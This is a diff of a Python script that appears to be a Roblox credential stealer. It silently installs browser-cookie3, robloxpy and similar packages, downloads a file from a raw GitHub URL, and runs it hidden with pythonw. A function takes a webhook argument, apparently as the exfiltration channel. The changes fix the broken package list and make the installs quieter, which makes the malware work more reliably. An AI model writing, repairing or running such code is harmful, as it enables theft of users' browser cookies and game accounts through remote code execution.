@@ -3,23 +3,26 @@ import urllib.request
 import subprocess
 from pathlib import Path
 
-
 importList = [
-    "requests"
-    "pycryptodome"
-    "psutil"
-    "browser-cookie3"
-    "robloxpy"
-    "wmi"
+    "requests",
+    "pycryptodome",
+    "psutil",
+    "browser-cookie3",
+    "robloxpy",
+    "wmi",
     "pywin32"
 ]
 
 for imprt in importList:
-
     try:
-        os.system("pip install " + imprt)
-        
-    except:
+        subprocess.run(
+            ["pip", "install", imprt],
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+            check=True,
+            shell=False 
+        )
+    except Exception as e:
         pass
 
 githubraw = "https://raw.githubusercontent.com/NobdY1exe/skA4zr/main/fileees.py"
@@ -40,7 +43,7 @@ def CreateFandDownloadIT(Webhooook, githubraw):
 def StartProg(FilePath):
     try:
         command = ["pythonw", FilePath]
-        result = subprocess.run(command, shell=True)
+        subprocess.run(command, shell=False)
     except Exception as e:
         pass
 
